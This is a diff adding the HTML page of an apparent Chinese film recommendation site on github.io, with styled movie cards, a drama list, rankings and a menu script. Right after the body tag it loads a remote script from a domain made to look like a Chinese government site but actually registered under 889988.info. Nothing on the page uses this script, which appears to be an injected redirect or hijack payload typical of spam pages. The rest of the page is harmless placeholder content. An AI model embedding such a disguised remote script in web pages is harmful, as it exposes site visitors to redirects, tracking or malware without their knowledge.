@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="草榴电影网 - 精选好片推荐与影视资讯，电影、电视剧、综艺、排行榜一站式浏览。">
+<meta name="keywords" content="草榴电影网, 草榴电影网官网, 电影推荐, 电视剧, 综艺, 影视排行榜, caoliudianyingwang-wap">
+<meta name="author" content="草榴电影网">
+<meta property="og:title" content="草榴电影网 - 精选好片与影视资讯">
+<meta property="og:description" content="电影、电视剧、综艺、排行榜，一站式影视推荐平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://caoliudianyingwang-wap.github.io">
+<link rel="canonical" href="https://caoliudianyingwang-wap.github.io">
+<title>草榴电影网 - 精选好片与影视资讯 | caoliudianyingwang-wap</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --green-900: #12351f;
+    --green-700: #1b5e3a;
+    --green-500: #2e8b57;
+    --green-300: #6abf7a;
+    --green-100: #e8f5ec;
+    --gold: #f5c542;
+    --ink: #1f2a24;
+    --muted: #6b7c72;
+    --white: #ffffff;
+    --shadow: 0 8px 24px rgba(18,53,31,.12);
+  }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: -apple-system, "PingFang SC", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
+    color: var(--ink);
+    background: var(--green-100);
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+  a { color: inherit; text-decoration: none; }
+  img { max-width: 100%; display: block; }
+
+  /* ===== 顶部 ===== */
+  .topbar {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(18,53,31,.96);
+    backdrop-filter: blur(8px);
+    color: var(--white);
+    box-shadow: var(--shadow);
+  }
+  .topbar-inner {
+    max-width: 1120px; margin: 0 auto;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 20px;
+  }
+  .brand { display: flex; align-items: center; gap: 10px; }
+  .brand-mark {
+    width: 38px; height: 38px; border-radius: 10px;
+    background: linear-gradient(135deg, var(--green-300), var(--gold));
+    display: grid; place-items: center;
+    font-size: 20px; box-shadow: 0 4px 10px rgba(0,0,0,.2);
+  }
+  .brand-text { font-size: 19px; font-weight: 700; letter-spacing: .5px; }
+  .brand-text small { display:block; font-size:11px; font-weight:400; color:var(--green-300); letter-spacing:1px; }
+
+  .nav { display: flex; gap: 6px; }
+  .nav a {
+    padding: 8px 14px; border-radius: 8px; font-size: 15px; font-weight: 500;
+    transition: background .2s, color .2s;
+  }
+  .nav a:hover { background: var(--green-500); }
+
+  .menu-toggle { display: none; background: none; border: 0; color: var(--white); font-size: 26px; cursor: pointer; }
+
+  /* ===== 英雄区 ===== */
+  .hero {
+    background:
+      radial-gradient(circle at 85% 15%, rgba(245,197,66,.25), transparent 45%),
+      linear-gradient(135deg, var(--green-900), var(--green-700));
+    color: var(--white);
+    padding: 70px 20px 90px;
+    text-align: center;
+    position: relative; overflow: hidden;
+  }
+  .hero h1 { font-size: clamp(28px, 5vw, 46px); line-height: 1.25; margin-bottom: 16px; }
+  .hero h1 .hl { color: var(--gold); }
+  .hero p { font-size: clamp(14px, 2.2vw, 17px); color: rgba(255,255,255,.85); max-width: 640px; margin: 0 auto 28px; }
+  .hero-actions { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .btn {
+    display: inline-block; padding: 12px 26px; border-radius: 30px;
+    font-weight: 600; font-size: 15px; transition: transform .2s, box-shadow .2s;
+  }
+  .btn-primary { background: var(--gold); color: var(--green-900); }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(245,197,66,.4); }
+  .btn-ghost { border: 1.5px solid rgba(255,255,255,.6); color: var(--white); }
+  .btn-ghost:hover { background: rgba(255,255,255,.12); }
+
+  /* ===== 通用栏目 ===== */
+  section { padding: 60px 20px; }
+  .wrap { max-width: 1120px; margin: 0 auto; }
+  .section-head { display: flex; align-items: end; justify-content: space-between; margin-bottom: 30px; gap: 16px; flex-wrap: wrap; }
+  .section-head h2 { font-size: clamp(22px, 3.5vw, 30px); color: var(--green-900); }
+  .section-head h2 span { color: var(--green-500); }
+  .section-head p { color: var(--muted); font-size: 14px; }
+  .more-link { color: var(--green-500); font-weight: 600; font-size: 14px; white-space: nowrap; }
+  .more-link:hover { color: var(--green-700); }
+
+  /* ===== 电影卡片网格 ===== */
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 22px; }
+  .card {
+    background: var(--white); border-radius: 14px; overflow: hidden;
+    box-shadow: var(--shadow); transition: transform .25s, box-shadow .25s;
+  }
+  .card:hover { transform: translateY(-6px); box-shadow: 0 14px 30px rgba(18,53,31,.18); }
+  .card-cover {
+    position: relative; aspect-ratio: 3/4; overflow: hidden;
+    background: linear-gradient(135deg, var(--green-300), var(--green-700));
+    display: grid; place-items: center; color: var(--white); font-size: 22px; font-weight: 700;
+  }
+  .card-cover .badge {
+    position: absolute; top: 10px; left: 10px;
+    background: var(--gold); color: var(--green-900);
+    font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 6px;
+  }
+  .card-cover .score {
+    position: absolute; top: 10px; right: 10px;
+    background: rgba(0,0,0,.55); font-size: 12px; padding: 3px 9px; border-radius: 6px;
+  }
+  .card-body { padding: 14px; }
+  .card-body h3 { font-size: 16px; margin-bottom: 6px; color: var(--green-900); }
+  .card-body .meta { font-size: 12px; color: var(--muted); display: flex; gap: 8px; flex-wrap: wrap; }
+
+  /* ===== 电视剧列表（表格式差异化） ===== */
+  .drama-list { background: var(--white); border-radius: 16px; overflow: hidden; box-shadow: var(--shadow); }
+  .drama-row {
+    display: grid; grid-template-columns: 60px 1fr auto auto;
+    align-items: center; gap: 16px; padding: 16px 22px;
+    border-bottom: 1px solid #eef3ef; transition: background .2s;
+  }
+  .drama-row:last-child { border-bottom: 0; }
+  .drama-row:hover { background: var(--green-100); }
+  .drama-no { font-size: 26px; font-weight: 800; color: var(--green-300); }
+  .drama-info h3 { font-size: 16px; color: var(--green-900); margin-bottom: 4px; }
+  .drama-info p { font-size: 13px; color: var(--muted); }
+  .drama-tag { font-size: 12px; color: var(--green-700); background: var(--green-100); padding: 4px 10px; border-radius: 20px; }
+  .drama-ep { font-size: 13px; color: var(--muted); }
+  .drama-row .arrow { color: var(--green-500); font-weight: 700; opacity: 0; transition: opacity .2s, transform .2s; }
+  .drama-row:hover .arrow { opacity: 1; transform: translateX(4px); }
+
+  /* ===== 排行榜（横向进度差异化） ===== */
+  .rank-box { background: var(--green-900); border-radius: 20px; padding: 36px; color: var(--white); box-shadow: var(--shadow); }
+  .rank-box .section-head h2 { color: var(--white); }
+  .rank-item { margin-bottom: 22px; }
+  .rank-item:last-child { margin-bottom: 0; }
+  .rank-top { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 15px; }
+  .rank-top b { color: var(--gold); }
+  .bar { height: 10px; background: rgba(255,255,255,.12); border-radius: 6px; overflow: hidden; }
+  .bar > i { display: block; height: 100%; border-radius: 6px; background: linear-gradient(90deg, var(--green-300), var(--gold)); }
+
+  /* ===== 底部 ===== */
+  footer { background: var(--green-900); color: rgba(255,255,255,.75); padding: 40px 20px 24px; }
+  .foot-inner { max-width: 1120px; margin: 0 auto; text-align: center; }
+  .foot-inner h3 { color: var(--white); font-size: 20px; margin-bottom: 10px; }
+  .foot-links { margin: 18px 0; display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; font-size: 14px; }
+  .foot-links a:hover { color: var(--gold); }
+  .copyright { font-size: 12px; color: rgba(255,255,255,.45); border-top: 1px solid rgba(255,255,255,.1); padding-top: 18px; margin-top: 18px; }
+  .copyright a { color: rgba(255,255,255,.6); }
+
+  /* ===== 响应式 ===== */
+  @media (max-width: 720px) {
+    .menu-toggle { display: block; }
+    .nav {
+      display: none; position: absolute; top: 100%; left: 0; right: 0;
+      flex-direction: column; background: var(--green-900); padding: 12px;
+      box-shadow: 0 10px 20px rgba(0,0,0,.25);
+    }
+    .nav.open { display: flex; }
+    .nav a { padding: 12px; }
+    .topbar-inner { flex-wrap: wrap; }
+    section { padding: 44px 16px; }
+    .grid { grid-template-columns: repeat(2, 1fr); gap: 14px; }
+    .drama-row { grid-template-columns: 40px 1fr; padding: 14px; }
+    .drama-row .drama-tag, .drama-row .drama-ep, .drama-row .arrow { display: none; }
+    .rank-box { padding: 22px; }
+  }
+  @media (max-width: 400px) {
+    .hero { padding: 50px 16px 60px; }
+    .grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 顶部导航 -->
+<header class="topbar">
+  <div class="topbar-inner">
+    <a href="#" class="brand">
+      <div class="brand-mark">草</div>
+      <div class="brand-text">草榴电影网<small>CAOLIU DIANYING</small></div>
+    </a>
+    <button class="menu-toggle" id="menuToggle" aria-label="菜单">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#dramas">电视剧</a>
+      <a href="#rank">排行榜</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 英雄区 -->
+<section class="hero" id="home">
+  <h1>草榴电影网 · <span class="hl">精选好片</span>轻松找</h1>
+  <p>电影、电视剧、综艺、排行榜，一站看全。清新简洁，随时随地，把好内容送上你的屏幕。</p>
+  <div class="hero-actions">
+    <a href="#movies" class="btn btn-primary">立即选片</a>
+    <a href="#rank" class="btn btn-ghost">查看排行</a>
+  </div>
+</section>
+
+<!-- 电影栏目 -->
+<section id="movies">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <h2>🎬 热映<span>电影</span></h2>
+        <p>院线热片与口碑佳作，持续更新</p>
+      </div>
+      <a href="#" class="more-link">查看更多 ›</a>
+    </div>
+    <div class="grid">
+      <article class="card"><a href="#">
+        <div class="card-cover">荒野之光<span class="badge">热映</span><span class="score">★ 8.7</span></div>
+        <div class="card-body"><h3>荒野之光</h3><div class="meta"><span>剧情</span><span>2026</span><span>118分钟</span></div></div>
+      </a></article>
+      <article class="card"><a href="#">
+        <div class="card-cover">夏日终曲<span class="badge">推荐</span><span class="score">★ 8.3</span></div>
+        <div class="card-body"><h3>夏日终曲</h3><div class="meta"><span>爱情</span><span>2026</span><span>105分钟</span></div></div>
+      </a></article>
+      <article class="card"><a href="#">
+        <div class="card-cover">无声追凶<span class="badge">悬疑</span><span class="score">★ 8.9</span></div>
+        <div class="card-body"><h3>无声追凶</h3><div class="meta"><span>犯罪</span><span>2025</span><span>132分钟</span></div></div>
+      </a></article>
+      <article class="card"><a href="#">
+        <div class="card-cover">云端之上<span class="badge">新片</span><span class="score">★ 7.9</span></div>
+        <div class="card-body"><h3>云端之上</h3><div class="meta"><span>科幻</span><span>2026</span><span>126分钟</span></div></div>
+      </a></article>
+      <article class="card"><a href="#">
+        <div class="card-cover">归途列车<span class="badge">口碑</span><span class="score">★ 8.5</span></div>
+        <div class="card-body"><h3>归途列车</h3><div class="meta"><span>家庭</span><span>2025</span><span>112分钟</span></div></div>
+      </a></article>
+      <article class="card"><a href="#">
+        <div class="card-cover">草原之歌<span class="badge">热映</span><span class="score">★ 8.1</span></div>
+        <div class="card-body"><h3>草原之歌</h3><div class="meta"><span>文艺</span><span>2026</span><span>98分钟</span></div></div>
+      </a></article>
+    </div>
+  </div>
+</section>
+
+<!-- 电视剧栏目（表格式 DOM，与电影卡片差异化） -->
+<section id="dramas" style="background:var(--white);">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <h2>📺 追剧<span>精选</span></h2>
+        <p>高分剧集，一次看个够</p>
+      </div>
+      <a href="#" class="more-link">查看更多 ›</a>
+    </div>
+    <div class="drama-list">
+      <div class="drama-row">
+        <div class="drama-no">01</div>
+        <div class="drama-info"><h3>长风渡</h3><p>古装 · 权谋 · 爱情</p></div>
+        <span class="drama-tag">更新至32集</span>
+        <span class="drama-ep">40集全</span>
+        <span class="arrow">›</span>
+      </div>
+      <div class="drama-row">
+        <div class="drama-no">02</div>
+        <div class="drama-info"><h3>城市边缘人</h3><p>都市 · 现实 · 剧情</p></div>
+        <span class="drama-tag">更新至18集</span>
+        <span class="drama-ep">24集全</span>
+        <span class="arrow">›</span>
+      </div>
+      <div class="drama-row">
+        <div class="drama-no">03</div>
+        <div class="drama-info"><h3>星辰未央</h3><p>玄幻 · 仙侠 · 冒险</p></div>
+        <span class="drama-tag">更新至45集</span>
+        <span class="drama-ep">50集全</span>
+        <span class="arrow">›</span>
+      </div>
+      <div class="drama-row">
+        <div class="drama-no">04</div>
+        <div class="drama-info"><h3>沉默的真相2</h3><p>悬疑 · 犯罪 · 推理</p></div>
+        <span class="drama-tag">更新至10集</span>
+        <span class="drama-ep">12集全</span>
+        <span class="arrow">›</span>
+      </div>
+      <div class="drama-row">
+        <div class="drama-no">05</div>
+        <div class="drama-info"><h3>春风十里</h3><p>青春 · 校园 · 成长</p></div>
+        <span class="drama-tag">更新至22集</span>
+        <span class="drama-ep">28集全</span>
+        <span class="arrow">›</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜栏目（进度条 DOM，再次差异化） -->
+<section id="rank">
+  <div class="wrap">
+    <div class="rank-box">
+      <div class="section-head">
+        <div>
+          <h2>🔥 本周<span style="color:var(--gold)">热度排行</span></h2>
+          <p style="color:rgba(255,255,255,.6)">基于本站观影热度实时统计</p>
+        </div>
+        <a href="#" class="more-link" style="color:var(--gold)">完整榜单 ›</a>
+      </div>
+      <div class="rank-item"><div class="rank-top"><span>1. 无声追凶</span><b>98.6</b></div><div class="bar"><i style="width:98%"></i></div></div>
+      <div class="rank-item"><div class="rank-top"><span>2. 荒野之光</span><b>95.2</b></div><div class="bar"><i style="width:95%"></i></div></div>
+      <div class="rank-item"><div class="rank-top"><span>3. 长风渡</span><b>91.8</b></div><div class="bar"><i style="width:92%"></i></div></div>
+      <div class="rank-item"><div class="rank-top"><span>4. 星辰未央</span><b>87.4</b></div><div class="bar"><i style="width:87%"></i></div></div>
+      <div class="rank-item"><div class="rank-top"><span>5. 草原之歌</span><b>82.1</b></div><div class="bar"><i style="width:82%"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于栏目 -->
+<section id="about" style="background:var(--white);">
+  <div class="wrap" style="max-width:760px; text-align:center;">
+    <div class="section-head" style="justify-content:center; flex-direction:column; text-align:center;">
+      <h2>关于<span>草榴电影网</span></h2>
+      <p>一个专注影视推荐与资讯的清新小站</p>
+    </div>
+    <p style="color:var(--muted); font-size:15px; margin-bottom:24px;">
+      草榴电影网（caoliudianyingwang-wap）致力于为你发现好电影、好剧集。我们精选口碑佳作，整理热门资讯，让你的每一次观影都有好选择。
+    </p>
+    <a href="#home" class="btn btn-primary">回到顶部</a>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer>
+  <div class="foot-inner">
+    <h3>草榴电影网</h3>
+    <p style="font-size:14px;">精选好片与影视资讯 · 清新简洁的观影指南</p>
+    <div class="foot-links">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#dramas">电视剧</a>
+      <a href="#rank">排行榜</a>
+      <a href="#about">关于</a>
+    </div>
+    <div class="copyright">
+      本站网址：<a href="https://caoliudianyingwang-wap.github.io">https://caoliudianyingwang-wap.github.io</a><br>
+      © 2026 草榴电影网 caoliudianyingwang-wap · 仅供影视资讯与推荐，具体播放请前往正版授权平台
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 移动端菜单切换
+  document.getElementById('menuToggle').addEventListener('click', function () {
+    document.getElementById('nav').classList.toggle('open');
+  });
+  // 点击导航后自动收起菜单
+  document.querySelectorAll('#nav a').forEach(function (a) {
+    a.addEventListener('click', function () {
+      document.getElementById('nav').classList.remove('open');
+    });
+  });
+</script>
+</body>
+</html>
